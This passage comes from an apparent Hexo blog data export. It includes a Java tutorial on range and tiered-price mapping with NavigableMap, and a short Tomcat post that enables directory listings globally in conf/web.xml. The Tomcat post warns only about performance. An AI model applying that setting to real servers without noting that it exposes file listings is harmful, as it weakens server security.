title=\"场景举例\"></a>场景举例</h4><p>举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。<br>具体的阶梯计价映射关系如下：</p>\n<table>\n<thead>\n<tr>\n<th>流量消费阶梯</th>\n<th>流量单价</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[0,100MB)</td>\n<td>0.15元/MB</td>\n</tr>\n<tr>\n<td>[100MB,500MB)</td>\n<td>0.08元/MB</td>\n</tr>\n<tr>\n<td>[500MB,1GB)</td>\n<td>0.05元/MB</td>\n</tr>\n<tr>\n<td>[1GB,2GB)</td>\n<td>0.04元/MB</td>\n</tr>\n<tr>\n<td>[2GB,15GB)</td>\n<td>0.03元/MB</td>\n</tr>\n<tr>\n<td>[15GB,∞)</td>\n<td>0.01元/MB</td>\n</tr>\n</tbody>\n</table>","more":"<h4 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> cn.yeshaoting.demo;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.util.List;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.Map.Entry;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.NavigableMap;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Lists;</div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Maps;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\"> * <span class=\"doctag\">@description</span> 阶梯计价</div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> Aug 8, 2016 12:26:39 PM</div><div class=\"line\"> */</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SteppedCalculateTest</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 流量下界阶梯</span></div><div class=\"line\">    <span class=\"keyword\">private</span> NavigableMap&lt;Integer, Double&gt; steppedFloorFlows = Maps.newTreeMap();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> GB = <span class=\"number\">1000</span>;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Before</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">0</span>, <span class=\"number\">0.15</span>);</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">100</span>, <span class=\"number\">0.08</span>);</div><div class=\"line\">        steppedFloorFlows.put(<span class=\"number\">500</span>, <span class=\"number\">0.05</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">1</span>, <span class=\"number\">0.04</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">2</span>, <span class=\"number\">0.03</span>);</div><div class=\"line\">        steppedFloorFlows.put(GB * <span class=\"number\">15</span>, <span class=\"number\">0.01</span>);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Test</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">continuousStepTest</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        List&lt;Integer&gt; flows = Lists.newArrayList(<span class=\"number\">70</span>, <span class=\"number\">100</span>, <span class=\"number\">200</span>, <span class=\"number\">500</span>, GB * <span class=\"number\">20</span>);</div><div class=\"line\">        calculate(flows);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">calculate</span><span class=\"params\">(List&lt;Integer&gt; flows)</span> </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">for</span> (Integer flow : flows) &#123;</div><div class=\"line\">            Entry&lt;Integer, Double&gt; entry = steppedFloorFlows.floorEntry(flow);</div><div class=\"line\">            System.out.println(<span class=\"string\">\"消费额:\"</span> + flow + <span class=\"string\">\"MB\\t -&gt; 档位:\"</span> + entry.getKey() + <span class=\"string\">\"\\t单价:\"</span> + entry.getValue());</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">消费额:70\t -&gt; 档位:0\t单价:0.15</div><div class=\"line\">消费额:100\t -&gt; 档位:100\t单价:0.08</div><div class=\"line\">消费额:200\t -&gt; 档位:100\t单价:0.08</div><div class=\"line\">消费额:500\t -&gt; 档位:500\t单价:0.05</div><div class=\"line\">消费额:20000\t -&gt; 档位:15000\t单价:0.03</div></pre></td></tr></table></figure>\n<h3 id=\"2-不连续的范围映射\"><a href=\"#2-不连续的范围映射\" class=\"headerlink\" title=\"2. 不连续的范围映射\"></a>2. 不连续的范围映射</h3><p>某些特殊的业务场景需要实现不连续的范围映射。</p>\n<h4 id=\"范围映射\"><a href=\"#范围映射\" class=\"headerlink\" title=\"范围映射\"></a>范围映射</h4><table>\n<thead>\n<tr>\n<th>范围</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[0,3)</td>\n<td>0</td>\n</tr>\n<tr>\n<td>[5,10)</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[100,200)</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"实现代码-1\"><a href=\"#实现代码-1\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> cn.yeshaoting.demo;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.util.List;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.Map.Entry;</div><div class=\"line\"><span class=\"keyword\">import</span> java.util.NavigableMap;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.lang3.tuple.Pair;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Lists;</div><div class=\"line\"><span class=\"keyword\">import</span> com.google.common.collect.Maps;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\"> * <span class=\"doctag\">@description</span> 范围映射</div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> Aug 8, 2016 12:26:39 PM</div><div class=\"line\"> */</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RangeCalculateTest</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 范围映射</span></div><div class=\"line\">    <span class=\"keyword\">private</span> NavigableMap&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; ranges = Maps.newTreeMap();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Before</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        ranges.put(<span class=\"number\">0</span>, Pair.of(<span class=\"number\">3</span>, <span class=\"number\">0</span>));       <span class=\"comment\">// 0..3     =&gt; 0</span></div><div class=\"line\">        ranges.put(<span class=\"number\">5</span>, Pair.of(<span class=\"number\">10</span>, <span class=\"number\">1</span>));      <span class=\"comment\">// 5..10    =&gt; 1</span></div><div class=\"line\">        ranges.put(<span class=\"number\">100</span>, Pair.of(<span class=\"number\">200</span>, <span class=\"number\">2</span>));   <span class=\"comment\">// 100..200 =&gt; 2</span></div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"meta\">@Test</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">uncontinuousStepTest</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">        List&lt;Integer&gt; values = Lists.newArrayList(<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">10</span>, <span class=\"number\">100</span>, <span class=\"number\">150</span>, <span class=\"number\">300</span>);</div><div class=\"line\">        calculate(values);</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">calculate</span><span class=\"params\">(List&lt;Integer&gt; values)</span> </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">for</span> (Integer value : values) &#123;</div><div class=\"line\">            Entry&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; entry = ranges.floorEntry(value);</div><div class=\"line\">            Pair&lt;Integer, Integer&gt; pair = entry.getValue();</div><div class=\"line\">            <span class=\"keyword\">if</span> (value &lt; pair.getKey()) &#123;</div><div class=\"line\">                System.out.println(<span class=\"string\">\"值:\"</span> + value + <span class=\"string\">\"\\t -&gt; 范围:[\"</span> + entry.getKey() + <span class=\"string\">\",\"</span> + pair.getKey()  + <span class=\"string\">\")\\t值:\"</span> + pair.getValue());</div><div class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">                System.out.println(<span class=\"string\">\"值:\"</span> + value + <span class=\"string\">\"\\t -&gt; 未包含的范围\"</span>);</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"执行结果-1\"><a href=\"#执行结果-1\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">值:2\t -&gt; 范围:[0,3)\t值:0</div><div class=\"line\">值:3\t -&gt; 未包含的范围</div><div class=\"line\">值:7\t -&gt; 范围:[5,10)\t值:1</div><div class=\"line\">值:10\t -&gt; 未包含的范围</div><div class=\"line\">值:100\t -&gt; 范围:[100,200)\t值:2</div><div class=\"line\">值:150\t -&gt; 范围:[100,200)\t值:2</div><div class=\"line\">值:300\t -&gt; 未包含的范围</div></pre></td></tr></table></figure>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><p>范围映射实现的核心类：java.util.NavigableMap</p>\n<h3 id=\"1-常用方法\"><a href=\"#1-常用方法\" class=\"headerlink\" title=\"1. 常用方法\"></a>1. 常用方法</h3><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>floorEntry</td>\n<td>返回小于等于指定key中的所有key中最大的一个key</td>\n</tr>\n<tr>\n<td>ceilingEntry</td>\n<td>返回大于等于指定key中的所有key中最小的一个key</td>\n</tr>\n<tr>\n<td>lowerEntry</td>\n<td>返回小于指定key中的所有key总最大的一个key</td>\n</tr>\n<tr>\n<td>higherEntry</td>\n<td>返回大于指定key中的所有key中最小的一个key</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-详解说明\"><a href=\"#2-详解说明\" class=\"headerlink\" title=\"2. 详解说明\"></a>2. 详解说明</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">NavigableMap</span>&lt;<span class=\"title\">K</span>, <span class=\"title\">V</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title\">SortedMap</span>&lt;<span class=\"title\">K</span>, <span class=\"title\">V</span>&gt; </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 获取小于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">lowerEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">lowerKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于或等于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">floorEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取小于或等于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">floorKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于或等于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">ceilingEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于或等于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">ceilingKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于指定key的第一个节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">higherEntry</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取大于指定key的第一个key</span></div><div class=\"line\">    <span class=\"function\">K <span class=\"title\">higherKey</span><span class=\"params\">(K key)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的第一个（最小的）节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">firstEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的最后一个（最大的）节点对象</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">lastEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的第一个节点对象，并从Map中移除改节点</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">pollFirstEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 获取Map的最后一个节点对象，并从Map中移除改节点</span></div><div class=\"line\">    Map.<span class=\"function\">Entry&lt;K, V&gt; <span class=\"title\">pollLastEntry</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前Map的逆序Map集合</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">descendingMap</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前Map中包含的所有key的Set集合</span></div><div class=\"line\">    <span class=\"function\">NavigableSet&lt;K&gt; <span class=\"title\">navigableKeySet</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map的逆序Set集合，Set由key组成</span></div><div class=\"line\">    <span class=\"function\">NavigableSet&lt;K&gt; <span class=\"title\">descendingKeySet</span><span class=\"params\">()</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（fromInclusive是否包含）和toKey（toInclusive是否包含） 之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">subMap</span><span class=\"params\">(K fromKey, <span class=\"keyword\">boolean</span> fromInclusive, K toKey, <span class=\"keyword\">boolean</span> toInclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回介于map第一个元素到toKey（inInclusive是否包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">headMap</span><span class=\"params\">(K toKey, <span class=\"keyword\">boolean</span> inclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（inInclusive是否包含） 到map最后一个元素之间的子map</span></div><div class=\"line\">    <span class=\"function\">NavigableMap&lt;K, V&gt; <span class=\"title\">tailMap</span><span class=\"params\">(K fromKey, <span class=\"keyword\">boolean</span> inclusive)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（包含）和toKey（不包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">subMap</span><span class=\"params\">(K fromKey, K toKey)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回介于map第一个元素到toKey（不包含）之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">headMap</span><span class=\"params\">(K toKey)</span></span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 返回当前map中介于fromKey（包含） 到map最后一个元素之间的子map</span></div><div class=\"line\">    <span class=\"function\">SortedMap&lt;K, V&gt; <span class=\"title\">tailMap</span><span class=\"params\">(K fromKey)</span></span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/questions/1314650/using-java-map-for-range-searches/1314708#1314708\">Using java map for range searches</a></li>\n<li><a href=\"http://www.importnew.com/17620.html\">给jdk写注释系列之jdk1.6容器(8)：TreeSet、NavigableMap、NavigableSet源码解析</a></li>\n<li><a href=\"http://my.oschina.net/kevinair/blog/191242\">Java集合<10> (NavigableMap)</a></li>\n</ol>"},{"title":"tomcat访问系统文件及文件夹","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\" />\n\n\n## 一、进入tomcat目录\n> cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37\n\n\n## 二、修改web.xml配置\n> vim conf/web.xml\n\n\n## 三、修改listings参数\n找到名为 **default** 的servlet配置。\n``` xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n修改listings参数值为 **true** 。\n\nlistings参数含义说明如下：\n``` xml\n  <!--   listings            Should directory listings be produced if there -->\n  <!--                       is no welcome file in this directory?  [false] -->\n  <!--                       WARNING: Listings for directories with many    -->\n  <!--                       entries can be slow and may consume            -->\n  <!--                       significant proportions of server resources.   -->\n```\n\n## 四、参考文档\nhttp://blog.csdn.net/guopengzhang/article/details/5948644\nhttp://xueli.blog.51cto.com/3325186/1585859","source":"_posts/article/java/tomcat访问系统文件及文件夹.md","raw":"title: tomcat访问系统文件及文件夹\ntags:\n  - tomcat\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\" />\n\n\n## 一、进入tomcat目录\n> cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37\n\n\n## 二、修改web.xml配置\n> vim conf/web.xml\n\n\n## 三、修改listings参数\n找到名为 **default** 的servlet配置。\n``` xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n修改listings参数值为 **true** 。\n\nlistings参数含义说明如下：\n``` xml\n  <!--   listings            Should directory listings be produced if there -->\n  <!--                       is no welcome file in this directory?  [false] -->\n  <!--                       WARNING: Listings for directories with many    -->\n  <!--                       entries can be slow and may consume            -->\n  <!--                       significant proportions of server resources.   -->\n```\n\n## 四、参考文档\nhttp://blog.csdn.net/guopengzhang/article/details/5948644\nhttp://xueli.blog.51cto.com/3325186/1585859","slug":"article/java/tomcat访问系统文件及文件夹","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrr002u5nbthfs7rup8","content":"<p><img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、进入tomcat目录\"><a href=\"#一、进入tomcat目录\" class=\"headerlink\" title=\"一、进入tomcat目录\"></a>一、进入tomcat目录</h2><blockquote>\n<p>cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37</p>\n</blockquote>\n<h2 id=\"二、修改web-xml配置\"><a href=\"#二、修改web-xml配置\" class=\"headerlink\" title=\"二、修改web.xml配置\"></a>二、修改web.xml配置</h2><blockquote>\n<p>vim conf/web.xml</p>\n</blockquote>\n<h2 id=\"三、修改listings参数\"><a href=\"#三、修改listings参数\" class=\"headerlink\" title=\"三、修改listings参数\"></a>三、修改listings参数</h2><p>找到名为 <strong>default</strong> 的servlet配置。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>default<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>debug<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>listings<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>修改listings参数值为 <strong>true</strong> 。</p>\n<p>listings参数含义说明如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!--   listings            Should directory listings be produced if there --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       is no welcome file in this directory?  [false] --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       WARNING: Listings for directories with many    --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       entries can be slow and may consume            --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       significant proportions of server resources.   --&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://blog.csdn.net/guopengzhang/article/details/5948644\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/guopengzhang/article/details/5948644</a><br><a href=\"http://xueli.blog.51cto.com/3325186/1585859\" 